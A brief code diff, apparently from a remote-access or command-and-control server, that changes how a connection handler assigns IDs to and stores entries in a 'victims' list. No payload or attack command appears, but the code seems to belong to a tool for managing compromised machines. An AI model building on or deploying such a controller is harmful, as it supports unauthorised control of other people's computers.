@@ -41,10 +41,11 @@ def on_new_client(conn, addr):
             victims.VICTIM_CTR+=1
             new_con = {
             "IP": str(addr),
-            "ID": 1,
+            "ID": victims.VICTIM_CTR,
             "Connection": conn
         }
-            victims.VICTIM_LIST[victims.VICTIM_CTR - 1] = new_con
+
+            victims.VICTIM_LIST.append(new_con)
             
     
 
